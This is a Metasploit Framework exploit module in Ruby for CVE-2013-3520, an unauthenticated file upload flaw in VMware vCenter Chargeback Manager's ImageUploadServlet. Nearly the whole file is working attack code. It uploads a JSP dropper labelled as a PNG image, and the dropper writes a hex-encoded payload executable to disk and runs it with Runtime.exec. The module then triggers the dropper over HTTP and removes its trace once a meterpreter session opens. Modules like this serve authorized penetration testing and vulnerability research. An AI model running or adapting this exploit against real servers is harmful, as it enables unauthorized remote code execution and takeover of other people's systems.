##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /Apache.*Win32/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'VMware vCenter Chargeback Manager ImageUploadServlet Arbitrary File Upload',
      'Description' => %q{
        This module exploits a code execution flaw in VMware vCenter Chargeback Manager,
        where the ImageUploadServlet servlet allows unauthenticated file upload. The files
        are uploaded to the /cbmui/images/ web path, where JSP code execution is allowed.
        The module has been tested successfully on VMware vCenter Chargeback Manager 2.0.1
        on Windows 2003 SP2.
      },
      'Author'       =>
        [
          'Andrea Micalizzi', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2013-3520' ],
          [ 'OSVDB', '94188' ],
          [ 'BID', '60484' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-147/' ]
        ],
      'Privileged'  => true,
      'Platform'    => 'win',
      'Arch' => ARCH_X86,
      'Targets'     =>
        [
          [ 'VMware vCenter Chargeback Manager 2.0.1 / Windows 2003 SP2', { } ]
        ],
      'DefaultOptions' =>
        {
          'SSL' => true
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'May 15 2013'))

    register_options(
      [
        Opt::RPORT(443)
      ], self.class)
  end

  #
  # Try to find and delete the jsp if we get a meterpreter.
  #
  def on_new_session(cli)

    if not @dropper or @dropper.empty?
      return
    end

    if cli.type != 'meterpreter'
      print_error("#{@peer} - Meterpreter not used. Please manually remove #{@dropper}")
      return
    end

    cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")

    begin
      print_status("#{@peer} - Searching: #{@dropper}")
      files = cli.fs.file.search("\\", @dropper)
      if not files or files.empty?
        print_error("#{@peer} - Unable to find #{@dropper}. Please manually remove it.")
        return
      end

      files.each { |f|
        print_warning("Deleting: #{f['path'] + "\\" + f['name']}")
        cli.fs.file.rm(f['path'] + "\\" + f['name'])
      }
      print_good("#{@peer} - #{@dropper} deleted")
      return
    rescue ::Exception => e
      print_error("#{@peer} - Unable to delete #{@dropper}: #{e.message}")
    end
  end

  def upload_file(filename, contents)
    post_data = Rex::MIME::Message.new
    post_data.add_part(contents, "image/png", nil, "form-data; name=\"#{rand_text_alpha(4+rand(4))}\"; filename=\"#{filename}\"")

    # Work around an incompatible MIME implementation
    data = post_data.to_s
    data.gsub!(/\r\n\r\n--_Part/, "\r\n--_Part")

    res = send_request_cgi(
    {
      'uri'     => normalize_uri("cbmui",  "ImageUploadServlet"),
      'method'  => 'POST',
      'data'    => data,
      'ctype'   => "multipart/form-data; boundary=#{post_data.bound}",
      'cookie'  => "JSESSIONID=#{@session}"
    })

    if res and res.code == 200
      return true
    else
      return false
    end
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri("cbmui", "en_US", "themes", "excel", "index.htm"),
    })

    if res and res.code == 200 and res.body =~ /vCenter Chargeback Manager/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    @peer = "#{rhost}:#{rport}"

    print_status("#{@peer} - Uploading JSP to execute the payload")

    exe = payload.encoded_exe
    exe_filename = rand_text_alpha(8) + ".exe"

    # The JSP dropper is needed because there isn't directory traversal, just
    # arbitrary file upload to a web path where JSP code execution is allowed.
    dropper = jsp_drop_and_execute(exe, exe_filename)
    dropper_filename = rand_text_alpha(8) + ".jsp"

    if upload_file(dropper_filename, dropper)
      register_files_for_cleanup(exe_filename)
      @dropper = dropper_filename
    else
      fail_with(Exploit::Failure::Unknown, "#{@peer} - JSP upload failed")
    end

    print_status("#{@peer} - Executing payload")
    send_request_cgi(
    {
      'uri'    => normalize_uri("cbmui", "images", dropper_filename),
      'method' => 'GET'
    })
  end

  # This should probably go in a mixin
  def jsp_drop_bin(bin_data, output_file)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|String data = "#{Rex::Text.to_hex(bin_data, "")}";\n|

    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream("#{output_file}");\n|

    jspraw << %Q|int numbytes = data.length();\n|

    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\n|
    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\n|
    jspraw << %Q|{\n|
    jspraw << %Q|  char char1 = (char) data.charAt(counter);\n|
    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\n|
    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\n|
    jspraw << %Q|  comb <<= 4;\n|
    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\n|
    jspraw << %Q|  bytes[counter/2] = (byte)comb;\n|
    jspraw << %Q|}\n|

    jspraw << %Q|outputstream.write(bytes);\n|
    jspraw << %Q|outputstream.close();\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def jsp_execute_command(command)
    jspraw =  %Q|<%@ page import="java.io.*" %>\n|
    jspraw << %Q|<%\n|
    jspraw << %Q|try {\n|
    jspraw << %Q|  Runtime.getRuntime().exec("chmod +x #{command}");\n|
    jspraw << %Q|} catch (IOException ioe) { }\n|
    jspraw << %Q|Runtime.getRuntime().exec("#{command}");\n|
    jspraw << %Q|%>\n|

    jspraw
  end

  def jsp_drop_and_execute(bin_data, output_file)
    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)
  end

end